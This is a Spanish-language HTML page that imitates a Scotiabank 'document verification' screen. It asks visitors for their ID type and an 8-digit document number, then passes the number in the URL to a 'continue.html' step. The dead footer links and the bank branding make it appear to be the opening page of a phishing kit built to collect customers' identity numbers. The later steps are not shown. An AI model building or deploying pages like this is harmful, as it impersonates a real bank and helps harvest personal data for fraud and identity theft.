<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank - Verificación de Documento</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://kit.fontawesome.com/3297378b0c.js" crossorigin="anonymous"></script>
    <link rel="icon" href="onlylogo.png" type="image/png">
</head>

<body>
    <header>
        <img src="logoname.png" alt="Scotiabank" class="logo">
    </header>

    <main>
        <div class="card">
            <img src="onlylogo.png" alt="Scotiabank Icon" class="icon">

            <!-- Modificación del formulario -->
            <form id="document-form" action="continue.html" method="get" onsubmit="sendDocumentNumber()">
                <div class="form-group">
                    <label for="document-type">Tipo de documento</label>
                    <select id="document-type" name="document-type" required>
                        <option value="DNI">DNI</option>
                        <option value="Pasaporte">Pasaporte</option>
                        <option value="CE">Carnet de Extranjería</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="document-number">Número de documento</label>
                    <input type="tel" id="document-number" name="document-number" placeholder="12345678" required pattern="\d{8}" maxlength="8" oninput="this.value = this.value.replace(/\D/g, '').slice(0, 8);" title="Debe ingresar exactamente 8 números">

                </div>

                <button type="submit" class="btn-submit">Continuar</button>
            </form>
        </div>
    </main>

    <footer>
        <a href="#" class="footer-link">
            <i class="fa-solid fa-phone"></i> Llámanos
        </a>
        <a href="#" class="footer-link">
            <i class="fa-solid fa-location-dot"></i> Ubícanos
        </a>
    </footer>

    <!-- Script para enviar datos en la URL -->
    <script>
        function sendDocumentNumber() {
            // Obtener el valor del campo "Número de documento"
            const documentNumber = document.getElementById('document-number').value;

            // Cambiar la acción del formulario para incluir el número de documento en la URL
            document.getElementById('document-form').action = `continue.html?document-number=${encodeURIComponent(documentNumber)}`;
        }
    </script>
</body>

</html>
